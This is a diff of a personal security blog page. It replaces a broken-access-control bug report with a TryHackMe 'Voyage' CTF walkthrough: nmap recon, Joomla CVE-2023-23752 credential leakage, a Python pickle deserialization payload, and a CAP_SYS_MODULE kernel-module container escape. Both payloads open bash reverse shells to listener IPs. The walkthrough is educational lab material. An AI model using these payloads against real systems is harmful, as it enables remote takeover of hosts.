@@ -3,246 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Broken Access Control | Omar Mesalam</title>
-    
-    <!-- Fonts & Icons -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        :root {
-            --bg-dark: #12161f;
-            --card-bg: rgba(22, 28, 39, 0.85);
-            --border-color: rgba(255, 255, 255, 0.08);
-            --accent-green: #10b981;
-            --accent-glow: rgba(16, 185, 129, 0.15);
-            --text-main: #f1f5f9;
-            --text-sub: #94a3b8;
-            --font-code: 'Fira Code', monospace;
-            --font-sans: 'Inter', sans-serif;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: var(--font-sans);
-            line-height: 1.8;
-            padding-bottom: 60px;
-        }
-
-        /* Top Navbar */
-        .navbar {
-            border-bottom: 1px solid var(--border-color);
-            padding: 16px 0;
-            background: rgba(18, 22, 31, 0.9);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .nav-container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-family: var(--font-code);
-            font-weight: 700;
-            color: var(--text-main);
-            text-decoration: none;
-        }
-
-        .logo-accent { color: var(--accent-green); }
-
-        .back-btn {
-            color: var(--accent-green);
-            text-decoration: none;
-            font-family: var(--font-code);
-            font-size: 0.9rem;
-            transition: opacity 0.2s;
-        }
-
-        .back-btn:hover { opacity: 0.8; }
-
-        /* Article Wrapper */
-        .article-container {
-            max-width: 850px;
-            margin: 40px auto;
-            padding: 0 20px;
-        }
-
-        .article-box {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 40px;
-        }
-
-        /* Header */
-        .article-header {
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 20px;
-            margin-bottom: 30px;
-        }
-
-        .article-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            line-height: 1.3;
-            margin-bottom: 12px;
-            color: var(--text-main);
-        }
-
-        .article-meta {
-            font-size: 0.85rem;
-            color: var(--text-sub);
-            font-family: var(--font-code);
-            display: flex;
-            gap: 15px;
-        }
-
-        .badge { color: var(--accent-green); }
-
-        /* Body Content Formatting */
-        .article-body h2 {
-            font-size: 1.25rem;
-            font-family: var(--font-code);
-            color: var(--accent-green);
-            margin: 30px 0 12px 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .article-body p {
-            color: #cbd5e1;
-            font-size: 0.98rem;
-            margin-bottom: 16px;
-        }
-
-        /* Lists formatting */
-        .article-body ol, .article-body ul {
-            margin-left: 20px;
-            margin-bottom: 20px;
-            color: #cbd5e1;
-        }
-
-        .article-body li {
-            margin-bottom: 8px;
-            font-size: 0.95rem;
-        }
-
-        .sub-list {
-            margin-top: 6px;
-            margin-bottom: 6px !important;
-            margin-left: 20px;
-        }
-
-        .sub-list li {
-            color: var(--accent-green);
-            font-family: var(--font-code);
-        }
-
-        /* Highlights */
-        code {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--accent-green);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-family: var(--font-code);
-            font-size: 0.88rem;
-        }
-
-        @media (max-width: 600px) {
-            .article-box { padding: 20px; }
-            .article-title { font-size: 1.4rem; }
-        }
-    </style>
+    <title>Voyage CTF - TryHackMe Walkthrough | Omar Mesalam</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 </head>
 <body>
+    <div class="container">
+        <!-- Header / Back Link -->
+        <header style="margin-bottom: 2rem;">
+            <a href="../index.html" class="read-more" style="display: inline-flex; align-items: center; gap: 8px;">
+                <i class="fa-solid fa-arrow-left"></i> Back to Writeups
+            </a>
+        </header>
 
-    <!-- Header Navbar -->
-    <header class="navbar">
-        <div class="nav-container">
-            <a href="../index.html" class="logo"><span class="logo-accent">&gt;</span> Omar Mesalam_</a>
-            <a href="../index.html" class="back-btn">&larr; Back to Writeups</a>
-        </div>
-    </header>
-
-    <div class="article-container">
-        <article class="article-box">
-            
-            <header class="article-header">
-                <h1 class="article-title">Voyage - CTF - TryHackMe</h1>
-                <div class="article-meta">
-                    <span class="badge">[ CTF Writeup]</span>
-          
+        <main>
+            <!-- Article Header -->
+            <article class="post-card" style="margin-bottom: 2rem;">
+                <div class="post-content">
+                    <div class="post-meta">
+                        <span class="post-date"><i class="fa-regular fa-calendar"></i> Aug 15, 2026</span>
+                        <span class="post-category"><i class="fa-solid fa-flag"></i> CTF Writeup</span>
+                    </div>
+                    <h1 class="post-title" style="font-size: 2rem; margin: 1rem 0;">Voyage - CTF - TryHackMe Walkthrough</h1>
+                    <div class="post-tags">
+                        <span class="tag">TryHackMe</span>
+                        <span class="tag">Docker Escape</span>
+                        <span class="tag">Python Deserialization</span>
+                        <span class="tag">CAP_SYS_MODULE</span>
+                    </div>
                 </div>
-            </header>
+            </article>
 
-            <div class="article-body">
-                <p>Now I have an IP address, I must first examine it to find out  what services are available on it 10.67.166.123 Then i use nmap to do this step</p>
+            <!-- Writeup Content -->
+            <div class="writeup-content" style="color: #d1d5db; line-height: 1.8;">
+                
+                <!-- 1. Reconnaissance -->
+                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
+                    <i class="fa-solid fa-network-wired"></i> 1. Reconnaissance & Enumeration
+                </h2>
+                <p>Now I have an IP address (<code>10.67.166.123</code>). I must first examine it to find out what services are available using Nmap:</p>
+                
+                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0; overflow-x: auto;">
+                    <div style="color: #8b949e; margin-bottom: 0.5rem;">┌──(root㉿omar)-[/home/mesalam/Downloads]<br>└─# nmap -Pn -sS -sV -O -sC 10.67.166.123</div>
+                    <pre style="color: #c9d1d9; margin: 0;">
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-14 07:40 EDT
+Nmap scan report for 10.67.166.123
+Host is up (0.22s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+| http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 16 disallowed entries (15 shown)
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+                    </pre>
+                </div>
 
-                <h2><i class="fa-solid fa-terminal"></i> Overview</h2>
-                <p>The issue was related to the handling of pending team invitations when a privileged user was removed from the team.</p>
-                <p>The application failed to properly invalidate the existing invitation or re-validate the intended role when the invited user accepted it.</p>
+                <p>Now we have nice information to start the attack. We notice port 80 is running Joomla! and port 2222 is running an additional SSH service.</p>
 
-                <h2><i class="fa-solid fa-terminal"></i> Steps to Reproduce</h2>
-                <ol>
-                    <li>Sign up for an account on the target application.</li>
-                    <li>Create a team and configure the following roles:
-                        <ul class="sub-list">
-                            <li>Owner</li>
-                            <li>Admin</li>
-                        </ul>
-                    </li>
-                    <li>From the Admin account, send a team invitation to a new user who is not currently a member.</li>
-                    <li>Do not accept the invitation yet.</li>
-                    <li>Log in as the Owner.</li>
-                    <li>Remove the Admin account from the team.</li>
-                    <li>Log in as the previously invited user.</li>
-                    <li>Accept the pending invitation.</li>
-                </ol>
+                <p>Next, we run directory brute-forcing using <code>dirsearch</code> and <code>whatweb</code> to understand the web application footprint:</p>
 
-                <h2><i class="fa-solid fa-terminal"></i> Result</h2>
-                <p>The invited user is added to the team with the <code>Admin</code> role, even though the original administrator who issued the invitation has already been removed.</p>
-                <p>The pending invitation effectively preserved a privileged role that should no longer have been valid.</p>
+                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0; overflow-x: auto;">
+                    <div style="color: #8b949e; margin-bottom: 0.5rem;">┌──(root㉿omar)-[/home/mesalam/Downloads]<br>└─# whatweb http://10.67.166.123</div>
+                    <pre style="color: #c9d1d9; margin: 0;">
+http://10.67.166.123 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, MetaGenerator[Joomla! - Open Source Content Management], Title[Home]
+                    </pre>
+                </div>
 
-                <h2><i class="fa-solid fa-terminal"></i> Impact</h2>
-                <ul>
-                    <li>Unauthorized privilege escalation.</li>
-                    <li>A user can obtain administrative privileges without proper authorization.</li>
-                    <li>Depending on the application's functionality, administrative access could allow management of team members, settings, and sensitive resources.</li>
+                <p>Discovered paths via directory enumeration:</p>
+                <ul style="list-style-type: square; color: #9ca3af; margin-left: 1.5rem;">
+                    <td><code>/administrator/</code> — Redirects to administrator login page</td>
+                    <td><code>/htaccess.txt</code> — Server configuration rules</td>
+                    <td><code>/robots.txt</code> — Disallowed directory listings</td>
                 </ul>
 
-                <h2><i class="fa-solid fa-terminal"></i> Root Cause</h2>
-                <p>The primary issue appears to be insufficient server-side authorization validation when processing pending invitations.</p>
-                <p>Invitations containing privileged roles were not properly invalidated after the associated administrator was removed from the team.</p>
-                <p>The application should not rely solely on the state of the invitation. The server should re-evaluate the authorization context and intended role when the invitation is accepted.</p>
+                <!-- 2. Exploitation & Initial Access -->
+                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
+                    <i class="fa-solid fa-bug"></i> 2. Initial Access (CVE-2023-23752)
+                </h2>
+                <p>Analyzing the Joomla installation revealed version <strong>Joomla 4.2.7</strong>, which is vulnerable to an authentication bypass flaw (<code>CVE-2023-23752</code>).</p>
+                
+                <p>Exploiting this flaw allowed us to leak database credentials. Testing these credentials against SSH on port 22 failed, but succeeded on port <strong>2222</strong> with <code>RootPassword@1234</code>.</p>
 
-                <h2><i class="fa-solid fa-terminal"></i> Recommended Fix</h2>
-                <ul>
-                    <li>Invalidate pending invitations when the issuer loses the required privileges.</li>
-                    <li>Perform server-side authorization checks when an invitation is accepted.</li>
-                    <li>Re-validate the inviter's permissions and the requested role before assigning privileges.</li>
-                    <li>Avoid trusting previously issued invitations as a permanent authorization mechanism.</li>
-                </ul>
+                <p>Upon logging in, checking environment variables confirmed we were inside a Docker container:</p>
 
-                <h2><i class="fa-solid fa-terminal"></i> Conclusion</h2>
-                <p>This finding demonstrates how authorization bugs can occur not only through direct role manipulation, but also through inconsistent state between invitations, users, and team roles.</p>
-                <p>Testing the complete lifecycle of privileged actions, including invitation creation, user removal, and invitation acceptance, can reveal authorization issues that may not be visible when testing each action individually.</p>
+                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
+                    <pre style="color: #c9d1d9; margin: 0;">
+root@f5eb774507f2:/# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@f5eb774507f2:/# cat /proc/1/cgroup
+0::/
+                    </pre>
+                </div>
+
+                <!-- 3. Internal Network Scanning & Pickle Ingestion -->
+                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
+                    <i class="fa-solid fa-server"></i> 3. Internal Pivot & Python Deserialization RCE
+                </h2>
+                <p>Scanning the internal subnet <code>192.168.100.0/24</code> from the container revealed three active hosts:</p>
+
+                <table style="width: 100%; border-collapse: collapse; margin: 1rem 0; background: #111827; border: 1px solid #1f2937;">
+                    <thead>
+                        <tr style="border-bottom: 1px solid #1f2937; color: #10b981; text-align: left;">
+                            <th style="padding: 0.75rem;">IP Address</th>
+                            <th style="padding: 0.75rem;">Role / Details</th>
+                            <th style="padding: 0.75rem;">Open Ports</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr style="border-bottom: 1px solid #1f2937;">
+                            <td style="padding: 0.75rem;">192.168.100.1</td>
+                            <td style="padding: 0.75rem;">Host / Main Server</td>
+                            <td style="padding: 0.75rem;">22, 80, 2222, 5000</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid #1f2937;">
+                            <td style="padding: 0.75rem;">192.168.100.10</td>
+                            <td style="padding: 0.75rem;">Current Container</td>
+                            <td style="padding: 0.75rem;">22 (Ubuntu 20.04)</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 0.75rem;">192.168.100.12</td>
+                            <td style="padding: 0.75rem;">Internal Flask App</td>
+                            <td style="padding: 0.75rem;">5000 (Werkzeug/3.1.3)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p>By establishing SSH local port forwarding, we forwarded port 5000 to inspect requests via Burp Suite. The Flask application stored user sessions using serialized Python cookies:</p>
+                <p><code>session_data=80049525000000000000007d94288c04...</code></p>
+
+                <p>Since the application relies on <code>pickle.loads()</code> to deserialize this session cookie, we generated an exploit payload for Remote Code Execution:</p>
+
+                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
+                    <pre style="color: #c9d1d9; margin: 0;">
+<span style="color: #ff7b72;">import</span> pickle
+<span style="color: #ff7b72;">import</span> os
+<span style="color: #ff7b72;">import</span> binascii
+
+<span style="color: #ff7b72;">class</span> <span style="color: #ffa657;">Exploit</span>(object):
+    <span style="color: #ff7b72;">def</span> <span style="color: #d2a8ff;">__reduce__</span>(self):
+        <span style="color: #ff7b72;">return</span> (os.system, (<span style="color: #a5d6ff;">'bash -c "/bin/bash -i >& /dev/tcp/192.168.216.29/4444 0>&1"'</span>,))
+
+<span style="color: #ff7b72;">if</span> __name__ == <span style="color: #a5d6ff;">'__main__'</span>:
+    <span style="color: #ff7b72;">print</span>(binascii.hexlify(pickle.dumps(Exploit())))
+                    </pre>
+                </div>
+
+                <p>Injecting the generated cookie payload granted us a secondary reverse shell in a separate internal container context.</p>
+
+                <!-- 4. Privilege Escalation & Container Escape -->
+                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
+                    <i class="fa-solid fa-terminal"></i> 4. Container Escape via CAP_SYS_MODULE
+                </h2>
+                <p>Running LinPEAS inside the new container highlighted a critical capability assigned to the container: <strong>CAP_SYS_MODULE</strong>.</p>
+                <p>This capability allows inserting Arbitrary Kernel Modules (LKM) directly into the running host system's kernel space.</p>
+
+                <p>We created a custom C kernel module pointing a reverse shell back to our listener host:</p>
+
+                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
+                    <pre style="color: #c9d1d9; margin: 0;">
+<span style="color: #ff7b72;">#include</span> <span style="color: #a5d6ff;">&lt;linux/kmod.h&gt;</span>
+<span style="color: #ff7b72;">#include</span> <span style="color: #a5d6ff;">&lt;linux/module.h&gt;</span>
+
+MODULE_LICENSE(<span style="color: #a5d6ff;">"GPL"</span>);
+MODULE_AUTHOR(<span style="color: #a5d6ff;">"AttackDefense"</span>);
+
+<span style="color: #ff7b72;">char</span>* argv[] = {<span style="color: #a5d6ff;">"/bin/bash"</span>, <span style="color: #a5d6ff;">"-c"</span>, <span style="color: #a5d6ff;">"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"</span>, NULL};
+<span style="color: #ff7b72;">static char</span>* envp[] = {<span style="color: #a5d6ff;">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>, NULL};
+
+<span style="color: #ff7b72;">static int</span> __init reverse_shell_init(<span style="color: #ff7b72;">void</span>) {
+    <span style="color: #ff7b72;">return</span> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+<span style="color: #ff7b72;">static void</span> __exit reverse_shell_exit(<span style="color: #ff7b72;">void</span>) {
+    printk(KERN_INFO <span style="color: #a5d6ff;">"Exiting\n"</span>);
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+                    </pre>
+                </div>
+
+                <p>We targeted kernel headers present at <code>/lib/modules/6.8.0-1030-aws/build</code>, compiled <code>rev.ko</code> using a custom Makefile, and executed <code>insmod rev.ko</code>.</p>
+
+                <p>The kernel module executed immediately in host space, escalating privileges from the container context to full **Root** access on the host node.</p>
+
             </div>
-
-        </article>
+        </main>
     </div>
-
 </body>
 </html>
